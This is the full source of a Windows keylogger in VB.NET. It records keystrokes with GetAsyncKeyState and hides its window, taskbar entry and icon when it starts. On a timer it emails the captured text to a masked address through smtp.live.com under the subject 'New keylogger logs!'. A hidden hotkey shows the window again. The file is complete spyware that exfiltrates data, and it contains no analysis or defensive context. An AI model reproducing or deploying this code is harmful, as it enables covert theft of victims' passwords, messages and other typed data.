Option Strict On
Imports System.Net.Mail
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "User32.dll" (ByVal vkey As Long) As Integer
    Private Sub tmrEmail_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrEmail.Tick
        Try
            Dim SmtpServer As New SmtpClient()
            SmtpServer.EnableSsl = True
            Dim mail As New MailMessage
            SmtpServer.Credentials = New Net.NetworkCredential("*********************", "///////////////")
            SmtpServer.Port = 25
            SmtpServer.Host = "smtp.live.com"
            mail = New MailMessage
            mail.From = New MailAddress("*****************************")
            mail.To.Add("**************************")
            mail.Subject = ("New keylogger logs!")
            mail.Body = txtLogs.text
            SmtpServer.Send(mail)
        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub tmrKeys_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrKeys.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                txtLogs.Text &= key

            Else
                txtLogs.Text &= key.ToLower
            End If
        End If

        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "H" Then
            Me.Visible = True
        End If
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        txtLogs.Text &= vbNewLine & "Keylogger stopped at : " & Now & vbNewLine
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Visible = False
        txtLogs.Text = "Keylogger started at: " & Now & vbNewLine
    End Sub
End Class
